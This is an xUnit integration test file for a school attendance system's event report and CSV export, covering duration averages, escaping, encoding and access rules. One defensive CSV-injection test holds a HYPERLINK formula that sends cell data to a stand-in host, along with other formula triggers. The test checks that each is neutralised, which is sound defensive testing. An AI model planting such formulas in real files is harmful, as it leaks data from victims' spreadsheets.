using System.Net;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using EAMS.Api.Reports;
using EAMS.Application.Abstractions;
using EAMS.Application.Dtos;
using EAMS.Domain;
using EAMS.Tests.Integration.Infrastructure;
using Xunit;

namespace EAMS.Tests.Integration;

/// <summary>
/// Task 9.6's single-event report in detail, and its CSV export (client QA MDVault #470; A6's
/// complete-pairs average; Q12's untouched Single events; JJ decision B's server-side CSV), end to end
/// over HTTP on real SQL Server — the aggregation is SQL, and SQL is what these tests exist to exercise.
/// </summary>
[Collection(DatabaseCollection.Name)]
public class ReportDetailApiTests : IntegrationTest
{
    public ReportDetailApiTests(SqlServerFixture sql) : base(sql) { }

    private static readonly DateTime In = TestData.Now;

    private static string DetailRoute(Guid eventId) => $"/api/v1/reports/event/{eventId}/detail";

    private static string AttendeesRoute(Guid eventId, int page = 1, int pageSize = Paging.MaxPageSize) =>
        $"/api/v1/reports/event/{eventId}/attendees?page={page}&pageSize={pageSize}";

    private static string CsvRoute(Guid eventId) => $"/api/v1/reports/event/{eventId}/export.csv";

    private static IEnumerable<string> EveryRoute(Guid eventId) =>
        [DetailRoute(eventId), AttendeesRoute(eventId), CsvRoute(eventId)];

    // ------------------------------------------------------------------------------ arrangement

    /// <summary>One student's row: a Time In, an optional Time Out, or no row at all when both are null.</summary>
    private sealed record Row(
        string LastName, DateTime? CheckIn, DateTime? CheckOut,
        string FirstName = "Maria", string Status = AttendanceStatus.Present, bool Invited = true);

    private async Task<Guid> NewSchoolAsync(string code = "USA")
    {
        await using var db = NewDbContext();
        var school = TestData.NewSchool(code);
        db.Schools.Add(school);
        await db.SaveChangesAsync();
        return school.Id;
    }

    /// <summary>
    /// An open event with one invited student per <paramref name="rows"/> entry. An entry with neither a
    /// Time In nor a Time Out is an invited student with no attendance row.
    /// </summary>
    private async Task<Guid> NewEventAsync(Guid schoolId, string mode, params Row[] rows)
    {
        await using var db = NewDbContext();

        var ev = TestData.NewEvent(schoolId, EventStatus.Open, mode);
        db.Events.Add(ev);

        for (var i = 0; i < rows.Length; i++)
        {
            var r = rows[i];
            var student = TestData.NewStudent(
                schoolId, $"2023-{i:D4}", firstName: r.FirstName, lastName: r.LastName);
            db.Students.Add(student);
            if (r.Invited) db.EventGroups.Add(new EventGroup { EventId = ev.Id, StudentId = student.Id });

            if (r.CheckIn is null && r.CheckOut is null) continue;

            db.AttendanceRecords.Add(new AttendanceRecord
            {
                SchoolId = schoolId,
                EventId = ev.Id,
                StudentId = student.Id,
                CheckInAt = r.CheckIn,
                CheckOutAt = r.CheckOut,
                Status = r.Status,
                CaptureMethod = CaptureMethod.Rfid,
            });
        }

        await db.SaveChangesAsync();
        return ev.Id;
    }

    private Task<HttpClient> AdminAsync(EamsApiFactory factory, Guid schoolId) =>
        SignedInClientAsync(factory, schoolId, EamsRoleNames.SchoolAdmin);

    private static async Task<EventDetailReportDto> DetailAsync(HttpClient client, Guid eventId)
    {
        var detail = await client.GetFromJsonAsync<EventDetailReportDto>(DetailRoute(eventId));
        Assert.NotNull(detail);
        return detail;
    }

    /// <summary>Every row of the on-screen list, walking the pages the way the SPA's listAll does.</summary>
    private static async Task<List<EventReportAttendeeDto>> AllAttendeesAsync(
        HttpClient client, Guid eventId, int pageSize = Paging.MaxPageSize)
    {
        var all = new List<EventReportAttendeeDto>();
        for (var page = 1; ; page++)
        {
            var result = await client.GetFromJsonAsync<PagedResult<EventReportAttendeeDto>>(
                AttendeesRoute(eventId, page, pageSize));
            Assert.NotNull(result);
            all.AddRange(result.Items);
            if (!result.HasMore) return all;
        }
    }

    private static async Task<(HttpResponseMessage Response, byte[] Bytes, List<List<string>> Records)> CsvAsync(
        HttpClient client, Guid eventId)
    {
        var response = await client.GetAsync(CsvRoute(eventId));
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        var bytes = await response.Content.ReadAsByteArrayAsync();
        return (response, bytes, ParseCsv(Encoding.UTF8.GetString(bytes).TrimStart('﻿')));
    }

    /// <summary>
    /// A small RFC 4180 reader, written independently of the writer so a symmetric bug in both cannot
    /// agree with itself: quoted fields, doubled quotes, and CR/LF inside quotes.
    /// </summary>
    private static List<List<string>> ParseCsv(string text)
    {
        var records = new List<List<string>>();
        var record = new List<string>();
        var cell = new StringBuilder();
        var quoted = false;

        for (var i = 0; i < text.Length; i++)
        {
            var c = text[i];
            if (quoted)
            {
                if (c == '"' && i + 1 < text.Length && text[i + 1] == '"') { cell.Append('"'); i++; }
                else if (c == '"') quoted = false;
                else cell.Append(c);
            }
            else if (c == '"') quoted = true;
            else if (c == ',') { record.Add(cell.ToString()); cell.Clear(); }
            else if (c == '\r' && i + 1 < text.Length && text[i + 1] == '\n')
            {
                record.Add(cell.ToString()); cell.Clear();
                records.Add(record); record = [];
                i++;
            }
            else cell.Append(c);
        }

        Assert.False(quoted, "The CSV ends inside an open quote.");
        Assert.True(cell.Length == 0 && record.Count == 0, "The CSV's last record is not terminated by CRLF.");
        return records;
    }

    /// <summary>The value on the totals line headed <paramref name="label"/>, or null when there is none.</summary>
    private static string? Line(List<List<string>> records, string label) =>
        records.FirstOrDefault(r => r.Count == 2 && r[0] == label)?[1];

    /// <summary>The student list: every record after its heading row.</summary>
    private static List<List<string>> ListRows(List<List<string>> records, string[] header)
    {
        var at = records.FindIndex(r => r.SequenceEqual(header));
        Assert.True(at >= 0, $"The CSV has no student-list heading row [{string.Join(", ", header)}].");
        return records.Skip(at + 1).ToList();
    }

    // ------------------------------------------------------------------------------ the totals

    /// <summary>
    /// QA A6: the average is over complete In/Out pairs only. One hour and two hours average 90 minutes;
    /// counting the third student's missing Time Out as zero would give 60, so a wrong average cannot pass.
    /// </summary>
    [Fact]
    public async Task Average_duration_counts_only_complete_pairs()
    {
        var schoolId = await NewSchoolAsync();
        var eventId = await NewEventAsync(schoolId, AttendanceMode.TimeInOut,
            new Row("Abad", In, In.AddHours(1)),
            new Row("Bautista", In, In.AddHours(2)),
            new Row("Cruz", In, null));

        using var factory = new EamsApiFactory(Sql.ConnectionString);
        using var client = await AdminAsync(factory, schoolId);

        var t = (await DetailAsync(client, eventId)).TimeInOut;
        Assert.NotNull(t);
        Assert.True(
            t.AverageDurationSeconds == 5400,
            $"Average duration was {t.AverageDurationSeconds}s. Over the two complete pairs (1h, 2h) it is " +
            "5400s; 3600s means the student who never timed out was averaged in as zero (QA A6).");
    }

    /// <summary>
    /// A6's other half: the number of students the average leaves out sits beside it — in the same JSON
    /// object, and on the adjacent CSV line — so the average is never read out of context.
    /// </summary>
    [Fact]
    public async Task Without_time_out_count_is_reported_beside_the_average()
    {
        var schoolId = await NewSchoolAsync();
        var eventId = await NewEventAsync(schoolId, AttendanceMode.TimeInOut,
            new Row("Abad", In, In.AddHours(1)),
            new Row("Bautista", In, null),
            new Row("Cruz", In, null));

        using var factory = new EamsApiFactory(Sql.ConnectionString);
        using var client = await AdminAsync(factory, schoolId);

        using var json = JsonDocument.Parse(await client.GetStringAsync(DetailRoute(eventId)));
        var block = json.RootElement.GetProperty("timeInOut");
        Assert.Equal(3600, block.GetProperty("averageDurationSeconds").GetInt64());
        Assert.Equal(2, block.GetProperty("withoutTimeOut").GetInt32());

        var (_, _, records) = await CsvAsync(client, eventId);
        var withoutAt = records.FindIndex(r => r.Count == 2 && r[0] == "Without Time Out");
        var averageAt = records.FindIndex(r => r.Count == 2 && r[0].StartsWith("Average Duration", StringComparison.Ordinal));
        Assert.True(withoutAt >= 0 && averageAt >= 0, "The CSV is missing the Without Time Out or Average Duration line.");
        Assert.True(Math.Abs(withoutAt - averageAt) == 1,
            "In the CSV the Without Time Out count must sit on the line next to the average (QA A6).");
        Assert.Equal("2", records[withoutAt][1]);
        Assert.Equal("1:00:00", records[averageAt][1]);
    }

    /// <summary>
    /// QA's 9.6 lists "Tapped OUT" and "With Time Out" as separate totals. In this system they are one
    /// count — Time Out is the last accepted tap, forward only. Pinned so that if QA says they differ,
    /// this goes red rather than the report silently printing one number twice.
    /// </summary>
    [Fact]
    public async Task Tapped_out_equals_rows_with_a_check_out()
    {
        var schoolId = await NewSchoolAsync();
        var eventId = await NewEventAsync(schoolId, AttendanceMode.TimeInOut,
            new Row("Abad", In, In.AddHours(1)),
            new Row("Bautista", In, In.AddMinutes(30), Status: AttendanceStatus.Late),
            new Row("Cruz", In, null),
            new Row("Dizon", In, null),
            new Row("Estrada", null, null));

        using var factory = new EamsApiFactory(Sql.ConnectionString);
        using var client = await AdminAsync(factory, schoolId);

        var t = (await DetailAsync(client, eventId)).TimeInOut;
        Assert.NotNull(t);
        Assert.Equal(2, t.TappedOut);
        Assert.Equal(t.WithTimeOut, t.TappedOut);
        Assert.Equal(4, t.TappedIn);
        Assert.Equal(2, t.WithoutTimeOut);
        Assert.Equal(t.TappedIn, t.WithTimeOut + t.WithoutTimeOut);
    }

    [Fact]
    public async Task Average_duration_is_null_when_nobody_has_timed_out()
    {
        var schoolId = await NewSchoolAsync();
        var eventId = await NewEventAsync(schoolId, AttendanceMode.TimeInOut,
            new Row("Abad", In, null),
            new Row("Bautista", In, null));

        using var factory = new EamsApiFactory(Sql.ConnectionString);
        using var client = await AdminAsync(factory, schoolId);

        // Present and null, not absent and not zero: zero would read as "everyone left immediately".
        using var json = JsonDocument.Parse(await client.GetStringAsync(DetailRoute(eventId)));
        var block = json.RootElement.GetProperty("timeInOut");
        Assert.Equal(JsonValueKind.Null, block.GetProperty("averageDurationSeconds").ValueKind);
        Assert.Equal(2, block.GetProperty("tappedIn").GetInt32());
        Assert.Equal(0, block.GetProperty("withTimeOut").GetInt32());
        Assert.Equal(2, block.GetProperty("withoutTimeOut").GetInt32());

        var (_, _, records) = await CsvAsync(client, eventId);
        Assert.Equal("", Line(records, "Average Duration (h:mm:ss, complete pairs only)"));
    }

    /// <summary>
    /// Closing an event writes an <c>Absent</c> row, with no Time In, for every expected student who
    /// never tapped. Those rows are counted by the summary's <c>absent</c> bucket and must not be counted
    /// as tapped in, nor listed.
    /// </summary>
    [Fact]
    public async Task Absent_rows_created_at_close_are_not_counted_as_tapped_in()
    {
        var schoolId = await NewSchoolAsync();
        var eventId = await NewEventAsync(schoolId, AttendanceMode.TimeInOut,
            new Row("Abad", In, In.AddHours(1)),
            new Row("Bautista", null, null),
            new Row("Cruz", null, null));

        await using (var db = NewDbContext())
        {
            var closed = await EventsOn(db).ChangeStatusAsync(eventId, EventStatus.Closed);
            Assert.Equal(EventWriteOutcome.Saved, closed.Outcome);
        }

        using var factory = new EamsApiFactory(Sql.ConnectionString);
        using var client = await AdminAsync(factory, schoolId);

        var detail = await DetailAsync(client, eventId);
        Assert.True(detail.Summary.Absent == 2,
            $"The close should have written 2 Absent rows; the summary reports {detail.Summary.Absent}. " +
            "Without them this test proves nothing.");
        Assert.NotNull(detail.TimeInOut);
        Assert.Equal(1, detail.TimeInOut.TappedIn);
        Assert.Equal(0, detail.TimeInOut.WithoutTimeOut);

        var list = await AllAttendeesAsync(client, eventId);
        Assert.Equal(["Abad"], list.Select(a => a.LastName));
    }

    /// <summary>
    /// A Time Out on a row with no Time In (the tap path can write one onto a manually created Excused
    /// row) is not a pair: counting it would make <c>withoutTimeOut</c> go negative.
    /// </summary>
    [Fact]
    public async Task A_time_out_on_a_row_with_no_time_in_is_not_a_pair()
    {
        var schoolId = await NewSchoolAsync();
        var eventId = await NewEventAsync(schoolId, AttendanceMode.TimeInOut,
            new Row("Abad", In, null),
            new Row("Bautista", null, In.AddHours(1), Status: AttendanceStatus.Excused));

        using var factory = new EamsApiFactory(Sql.ConnectionString);
        using var client = await AdminAsync(factory, schoolId);

        var t = (await DetailAsync(client, eventId)).TimeInOut;
        Assert.NotNull(t);
        Assert.Equal((1, 0, 1, (long?)null), (t.TappedIn, t.WithTimeOut, t.WithoutTimeOut, t.AverageDurationSeconds));
    }

    /// <summary>
    /// QA Q12: a single-tap event is unchanged. Its report has no time-out block — <c>null</c>, not zeros —
    /// its list shows no Time Out even where the row holds one, and its CSV has neither the totals nor
    /// the columns.
    /// </summary>
    [Fact]
    public async Task Single_mode_event_report_carries_no_time_out_statistics()
    {
        var schoolId = await NewSchoolAsync();
        var eventId = await NewEventAsync(schoolId, AttendanceMode.Single,
            new Row("Abad", In, In.AddHours(1)),
            new Row("Bautista", In, null));

        using var factory = new EamsApiFactory(Sql.ConnectionString);
        using var client = await AdminAsync(factory, schoolId);

        using var json = JsonDocument.Parse(await client.GetStringAsync(DetailRoute(eventId)));
        Assert.Equal(JsonValueKind.Null, json.RootElement.GetProperty("timeInOut").ValueKind);
        Assert.Equal(AttendanceMode.Single, json.RootElement.GetProperty("event").GetProperty("attendanceMode").GetString());

        var list = await AllAttendeesAsync(client, eventId);
        Assert.Equal(2, list.Count);
        Assert.All(list, a => Assert.Null(a.TimeOut));
        Assert.All(list, a => Assert.Null(a.DurationSeconds));

        var (_, _, records) = await CsvAsync(client, eventId);
        foreach (var label in new[] { "Tapped IN", "Tapped OUT", "With Time Out", "Without Time Out" })
            Assert.Null(Line(records, label));
        Assert.DoesNotContain(records, r => r.Count == 2 && r[0].StartsWith("Average Duration", StringComparison.Ordinal));
        Assert.Equal(2, ListRows(records, EventReportCsv.SingleListHeader).Count);
        Assert.DoesNotContain(records, r => r.SequenceEqual(EventReportCsv.TimeInOutListHeader));
    }

    // ------------------------------------------------------------------------------ the list

    [Fact]
    public async Task Student_list_duration_is_check_out_minus_check_in()
    {
        var schoolId = await NewSchoolAsync();
        var eventId = await NewEventAsync(schoolId, AttendanceMode.TimeInOut,
            new Row("Abad", In, In.AddHours(1).AddMinutes(30).AddSeconds(15)),
            new Row("Bautista", In, In.AddHours(49)),
            new Row("Cruz", In.AddMinutes(5), null));

        using var factory = new EamsApiFactory(Sql.ConnectionString);
        using var client = await AdminAsync(factory, schoolId);

        var list = await AllAttendeesAsync(client, eventId);
        Assert.Equal(["Abad", "Bautista", "Cruz"], list.Select(a => a.LastName));

        foreach (var a in list.Where(a => a.TimeOut is not null))
            Assert.Equal((long)(a.TimeOut!.Value - a.TimeIn).TotalSeconds, a.DurationSeconds);

        Assert.Equal(5415, list[0].DurationSeconds);
        Assert.Equal(49 * 3600, list[1].DurationSeconds);
        Assert.Null(list[2].TimeOut);
        Assert.Null(list[2].DurationSeconds);

        var rows = ListRows((await CsvAsync(client, eventId)).Records, EventReportCsv.TimeInOutListHeader);
        Assert.Equal(["1:30:15", "49:00:00", ""], rows.Select(r => r[6]));
    }

    // ------------------------------------------------------------------------------ the CSV

    /// <summary>
    /// The file and the screen are one report: every CSV list row equals the paged list's row at the same
    /// position (walked in pages of three, so a paging seam is crossed), and every total equals the JSON.
    /// </summary>
    [Fact]
    public async Task Csv_export_matches_the_on_screen_report_row_for_row()
    {
        var schoolId = await NewSchoolAsync();
        var eventId = await NewEventAsync(schoolId, AttendanceMode.TimeInOut,
            new Row("Santos", In, In.AddHours(2)),
            new Row("Abad", In.AddMinutes(20), null, Status: AttendanceStatus.Late),
            new Row("Santos", In, In.AddHours(1), FirstName: "Ana"),
            new Row("Reyes", In, In.AddMinutes(45)),
            new Row("Mendoza", In, null),
            new Row("Garcia", In, In.AddHours(3)),
            new Row("Dela Cruz", In, In.AddMinutes(90)),
            new Row("Villanueva", null, null),
            new Row("Walkin", In, In.AddHours(1), Invited: false));

        using var factory = new EamsApiFactory(Sql.ConnectionString);
        using var client = await AdminAsync(factory, schoolId);

        var detail = await DetailAsync(client, eventId);
        var screen = await AllAttendeesAsync(client, eventId, pageSize: 3);
        var (_, _, records) = await CsvAsync(client, eventId);
        var file = ListRows(records, EventReportCsv.TimeInOutListHeader);

        Assert.NotNull(detail.TimeInOut);
        Assert.Equal(detail.TimeInOut.TappedIn, screen.Count);
        Assert.Equal(screen.Count, file.Count);

        for (var i = 0; i < screen.Count; i++)
        {
            var a = screen[i];
            string[] expected =
            [
                a.StudentNumber, a.LastName, a.FirstName, a.MiddleName ?? "",
                EventReportCsv.Time(a.TimeIn),
                a.TimeOut is { } o ? EventReportCsv.Time(o) : "",
                a.DurationSeconds is { } d ? EventReportCsv.Duration(d) : "",
            ];
            Assert.True(expected.SequenceEqual(file[i]),
                $"CSV row {i} [{string.Join(" | ", file[i])}] differs from the screen's [{string.Join(" | ", expected)}].");
        }

        var t = detail.TimeInOut;
        var s = detail.Summary;
        Assert.Equal(detail.Event.Name, Line(records, "Event"));
        Assert.Equal(detail.Event.Location, Line(records, "Location"));
        Assert.Equal(EventReportCsv.Time(detail.Event.StartAt), Line(records, "Starts (UTC)"));
        Assert.Equal(AttendanceMode.TimeInOut, Line(records, "Mode"));
        Assert.Equal(detail.Event.GraceMinutes.ToString(), Line(records, "Grace (minutes)"));
        Assert.Equal(s.Expected.ToString(), Line(records, "Expected"));
        Assert.Equal(s.Present.ToString(), Line(records, "Present"));
        Assert.Equal(s.Late.ToString(), Line(records, "Late"));
        Assert.Equal(s.Unexpected.ToString(), Line(records, "Unexpected"));
        Assert.Equal(t.TappedIn.ToString(), Line(records, "Tapped IN"));
        Assert.Equal(t.TappedOut.ToString(), Line(records, "Tapped OUT"));
        Assert.Equal(t.WithTimeOut.ToString(), Line(records, "With Time Out"));
        Assert.Equal(t.WithoutTimeOut.ToString(), Line(records, "Without Time Out"));
        Assert.Equal(EventReportCsv.Duration(t.AverageDurationSeconds!.Value),
            Line(records, "Average Duration (h:mm:ss, complete pairs only)"));

        // And the numbers are the arranged ones: the equalities above are not two empty reports agreeing.
        Assert.Equal((8, 6, 2), (t.TappedIn, t.WithTimeOut, t.WithoutTimeOut));
        Assert.Equal(["Abad", "Dela Cruz", "Garcia", "Mendoza", "Reyes", "Santos", "Santos", "Walkin"],
            screen.Select(a => a.LastName));
        Assert.Equal("Ana", screen[5].FirstName);
    }

    [Fact]
    public async Task Csv_escapes_commas_quotes_and_newlines_in_names()
    {
        const string awkward = "Cruz, \"Jr.\"\nII";
        var schoolId = await NewSchoolAsync();
        var eventId = await NewEventAsync(schoolId, AttendanceMode.TimeInOut,
            new Row(awkward, In, In.AddHours(1), FirstName: "Ana\r\nMarie"));

        using var factory = new EamsApiFactory(Sql.ConnectionString);
        using var client = await AdminAsync(factory, schoolId);

        var (_, bytes, records) = await CsvAsync(client, eventId);
        var text = Encoding.UTF8.GetString(bytes);
        Assert.Contains("\"Cruz, \"\"Jr.\"\"\nII\"", text);

        var row = Assert.Single(ListRows(records, EventReportCsv.TimeInOutListHeader));
        Assert.Equal(7, row.Count);
        Assert.Equal(awkward, row[1]);
        Assert.Equal("Ana\r\nMarie", row[2]);
    }

    /// <summary>
    /// OWASP CSV injection. A name from the SIS roster that begins with <c>=</c>, <c>+</c>, <c>-</c>,
    /// <c>@</c>, tab or CR would run as a formula when the file is opened in Excel; each is written with a
    /// leading <c>'</c>, and so is an event name that tries the same thing.
    /// </summary>
    [Fact]
    public async Task Csv_neutralises_a_formula_in_a_name()
    {
        const string formula = "=HYPERLINK(\"http://evil.example/?d=\"&A1,\"click\")";
        string[] triggers = [formula, "+1+1", "-2+3", "@SUM(A1)", "\tcmd", "\rcmd"];

        var schoolId = await NewSchoolAsync();
        var rows = triggers.Select((t, i) => new Row($"L{i}", In, In.AddHours(1), FirstName: t)).ToArray();
        var eventId = await NewEventAsync(schoolId, AttendanceMode.TimeInOut, rows);

        await using (var db = NewDbContext())
        {
            var ev = await db.Events.FindAsync(eventId);
            ev!.Name = "=1+1";
            await db.SaveChangesAsync();
        }

        using var factory = new EamsApiFactory(Sql.ConnectionString);
        using var client = await AdminAsync(factory, schoolId);

        var (_, _, records) = await CsvAsync(client, eventId);
        var list = ListRows(records, EventReportCsv.TimeInOutListHeader);

        Assert.Equal(triggers.Select(t => "'" + t), list.Select(r => r[2]));
        Assert.Equal("'=1+1", Line(records, "Event"));

        char[] dangerous = ['=', '+', '-', '@', '\t', '\r'];
        foreach (var cell in records.SelectMany(r => r).Where(c => c.Length > 0))
            Assert.True(Array.IndexOf(dangerous, cell[0]) < 0, $"The CSV has a cell a spreadsheet would run: [{cell}].");
    }

    [Fact]
    public async Task Csv_is_utf8_with_bom_and_keeps_n_tilde()
    {
        var schoolId = await NewSchoolAsync();
        var eventId = await NewEventAsync(schoolId, AttendanceMode.TimeInOut,
            new Row("Peñaflorida", In, In.AddHours(1), FirstName: "Niño"));

        using var factory = new EamsApiFactory(Sql.ConnectionString);
        using var client = await AdminAsync(factory, schoolId);

        var (response, bytes, records) = await CsvAsync(client, eventId);

        Assert.Equal(new byte[] { 0xEF, 0xBB, 0xBF }, bytes.Take(3));
        Assert.Equal("text/csv", response.Content.Headers.ContentType?.MediaType);
        Assert.Equal("utf-8", response.Content.Headers.ContentType?.CharSet);

        var row = Assert.Single(ListRows(records, EventReportCsv.TimeInOutListHeader));
        Assert.Equal(("Peñaflorida", "Niño"), (row[1], row[2]));

        var disposition = response.Content.Headers.ContentDisposition;
        Assert.NotNull(disposition);
        Assert.Equal("attachment", disposition.DispositionType);
        Assert.Equal($"{EventReportCsv.FileNamePrefix}-2026-07-28-{eventId:N}.csv", disposition.FileName?.Trim('"'));
        Assert.True(response.Headers.CacheControl?.NoStore == true, "The CSV must be sent Cache-Control: no-store.");
    }

    // ------------------------------------------------------------------------------ access

    /// <summary>
    /// The export sits under the existing <c>reports.read</c> — administrators only (QA Q16) — with no
    /// separate export permission. Pinned over HTTP on all three new routes.
    /// </summary>
    [Fact]
    public async Task Csv_export_is_403_for_Organizer_and_Viewer_and_401_anonymous()
    {
        var schoolId = await NewSchoolAsync();
        var eventId = await NewEventAsync(schoolId, AttendanceMode.TimeInOut, new Row("Abad", In, In.AddHours(1)));

        using var factory = new EamsApiFactory(Sql.ConnectionString);

        using (var anonymous = factory.CreateClient())
        {
            foreach (var route in EveryRoute(eventId))
            {
                var response = await anonymous.GetAsync(route);
                Assert.True(response.StatusCode == HttpStatusCode.Unauthorized,
                    $"GET {route} with no credential answered {(int)response.StatusCode}; it must be 401.");
            }
        }

        foreach (var role in new[] { EamsRoleNames.Viewer, EamsRoleNames.Organizer })
        {
            using var client = await SignedInClientAsync(factory, schoolId, role);
            foreach (var route in EveryRoute(eventId))
            {
                var response = await client.GetAsync(route);
                Assert.True(response.StatusCode == HttpStatusCode.Forbidden,
                    $"A signed-in {role} was answered {(int)response.StatusCode} on GET {route}; it must be 403.");
            }
        }

        using var admin = await AdminAsync(factory, schoolId);
        foreach (var route in EveryRoute(eventId))
            Assert.Equal(HttpStatusCode.OK, (await admin.GetAsync(route)).StatusCode);
    }

    [Fact]
    public async Task Report_of_another_schools_event_is_404()
    {
        var ours = await NewSchoolAsync("USA");
        var theirs = await NewSchoolAsync("CPU");
        var foreignEvent = await NewEventAsync(theirs, AttendanceMode.TimeInOut, new Row("Abad", In, In.AddHours(1)));

        using var factory = new EamsApiFactory(Sql.ConnectionString);

        foreach (var role in new[] { EamsRoleNames.SchoolAdmin, EamsRoleNames.SuperAdmin })
        {
            using var client = await SignedInClientAsync(factory, ours, role);
            foreach (var route in EveryRoute(foreignEvent).Append(DetailRoute(Guid.NewGuid())))
            {
                var response = await client.GetAsync(route);
                Assert.True(response.StatusCode == HttpStatusCode.NotFound,
                    $"A {role} of another school was answered {(int)response.StatusCode} on GET {route}; it must be 404.");
            }
        }
    }
}
